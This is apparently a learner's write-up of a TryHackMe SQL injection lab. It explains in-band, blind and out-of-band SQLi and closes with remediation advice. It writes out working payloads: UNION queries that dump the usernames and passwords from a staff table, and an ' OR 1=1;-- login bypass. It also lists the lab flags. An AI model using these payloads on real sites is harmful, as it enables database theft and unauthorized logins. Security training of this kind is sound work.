SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed.

# In-Band SQLi

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results

## Error-Based SQLi

This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen.

## Union-Based SQL Injection

This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page.

## Mini-lab

This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page.

Our Goal is to find and return martin's password to get the flag.

First we try to append `UNION SELECT 1` to see if we can get any extra results, however that returns a cardinality error. To get past this, we can just add more columns to the second part of the query like so `UNION SELECT 1,2,3` until we no longer see the error.

While we're able to get more information from the website, we need to figure out how we can get the website to actually display the information. We can do this by switching the id in the first part of the query from 0 to 1

Now we see that the website just takes the information from the first 3 columns and puts it directly onto the page. Because of this we can query for more specific information starting with the database name `UNION SELECT 1,2,database()`. Running that query returns "sqli_one"

Next we want to get information on the table names in the database `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'` which returns article and staff users

Because we want to find martin's password, we'll want to examine the staff_users table further. We can do so using the following query `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'` this gives us the column names of "id,password,username" for the staff_users table.

Password is the one that's of interest to us, and we specifically want to filter for martin's which can be done with `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users` This outputs all of the plaintext passwords stored in the DB among which is martin's. Putting in his password gives the flag THM{SQL_INJECTION_3840}

# Blind SQLi

Blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless.

## Authentication Bypass

One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login.

### Lab 

Most login forms only care if the backend returns true or false. In this case the query made to the DB is the following `select * from users where username='%username%' and password='%password%' LIMIT 1;` we can bypass this function and force the backend to return true by putting the following into the password field `' OR 1=1;--` Doing so bypasses the login and gives the flag THM{SQL_INJECTION_9581}

## Boolean Based

Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not.

### Lab

On level three of the SQL Injection Examples Machine, you're presented with a mock browser with the following URL:

**https://website.thm/checkuser?username=admin**

The browser body contains the contents of **{"taken":true}**. This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username.

The backend SQL query looks like so `select * from users where username = '%username%' LIMIT 1;`

Like in previous levels, our first task is to establish the number of columns in the users table, which we can achieve by using the UNION statement in the following manner `admin123' UNION SELECT 1;--` this query returns false so we know it's the incorrect number of columns.

Like in the previous lab we can change the query like so to get the correct number of columns returned `admin123' UNION SELECT 1,2,3;--`

Now we need to get the database name, to do this we can use the like operator to find what the name starts with and each letter there after, an example of this is the following `admin123' UNION SELECT 1,2,3 where database() like 's%';--`

You can continue this once you have the database name to find the table name containing the information you want like so `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--` doing this eventually gives us all of the table names including 'users'

We then repeat the process until we find the column name we want making sure to exclude column names that have already been found. Example: `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';`

Finally repeat the process for username and password until the correct combo is found. Inputting the password and username into the field we get the flag THM{SQL_INJECTION_1093}

## Time-Based

A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as **SLEEP(x)** alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement.

Similar to the steps we used in the boolean based SQLi, except we determine success or failure from how long it takes for the query to execute. 

Eventually you can get the table name users, username of admin, and password 4961 of 
logging in with these credentials gives the flag THM{SQL_INJECTION_MASTER}

# Out-of-Band SQLi

Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.  
  
An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2) The Website makes an SQL query to the database which also passes the hacker's payload.

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

# Remediation

## Prepared Statements with parameterized queries

In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data

## Input Validation

Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow.

## Escaping User Input

Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (**\**) to these characters, which then causes them to be parsed just as a regular string and not a special character.